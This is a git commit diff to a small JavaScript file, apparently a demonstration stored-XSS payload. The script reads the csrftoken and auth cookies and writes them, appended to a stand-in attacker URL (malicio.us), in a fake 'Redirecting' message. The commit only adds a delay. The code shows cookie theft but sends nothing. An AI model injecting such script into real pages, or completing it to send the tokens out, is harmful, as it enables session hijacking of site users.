67b097434497514ad33d838a837015dc0f616518
Alex Szabo <delanni.alex@gmail.com>
2021-05-28 11:24:34 +0200

    Update sxss.js

--- sxss.js
+++ sxss.js
@@ -3,5 +3,7 @@
 const csrf = document.cookie.match(/csrftoken=[^;]+/)[0];
 const auth = document.cookie.match(/auth=[^;]+/)[0];
 
-document.write(`Redirecting to http://malicio.us/?${csrf}&${auth}`);
-setInterval(() => document.write('.'), 300);
+setTimeout(() => {
+  document.write(`Redirecting to http://malicio.us/?${csrf}&${auth}`);
+  setInterval(() => document.write('.'), 300);
+}, 500);
